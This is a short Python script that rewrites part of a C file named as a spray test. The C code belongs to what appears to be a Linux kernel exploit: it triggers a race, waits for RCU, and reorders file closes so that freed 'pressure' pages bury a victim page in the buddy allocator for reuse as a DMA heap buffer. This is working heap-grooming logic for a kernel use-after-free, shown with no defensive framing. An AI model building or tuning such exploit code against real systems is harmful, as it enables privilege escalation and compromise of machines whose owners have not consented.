with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

old_code = """    for (int i = 0; i < BATCH_A_SIZE; i++) {
        if (batch_a_fds[i] >= 0) close(batch_a_fds[i]);
    }
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        if (batch_b_fds[i] >= 0) close(batch_b_fds[i]);
    }

    // Close background pressure files so they are on TOP of the buddy freelist
    // When dma_heap_ioctl_alloc allocates filp objects, it will consume these pages first
    // Leaving the victim page deeper in the buddy stack to be used as a DMA buffer page
    for (int i = 0; i < BG_PRESSURE; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }

    printf("[*] RACE TRIGGERED. Waiting for RCU...\\n");
    fflush(stdout);
    sleep(2);"""

new_code = """    for (int i = 0; i < BATCH_A_SIZE; i++) {
        if (batch_a_fds[i] >= 0) close(batch_a_fds[i]);
    }
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        if (batch_b_fds[i] >= 0) close(batch_b_fds[i]);
    }

    printf("[*] RACE TRIGGERED. Waiting for Victim RCU...\\n");
    fflush(stdout);
    sleep(2); // Victim page goes to buddy allocator
    
    printf("[*] Closing background pressure files to bury the victim page...\\n");
    fflush(stdout);
    for (int i = 0; i < BG_PRESSURE; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }
    
    printf("[*] Waiting for BG Pressure RCU...\\n");
    fflush(stdout);
    sleep(2); // BG pages go to buddy allocator, ON TOP of victim page!"""

text = text.replace(old_code, new_code)

with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
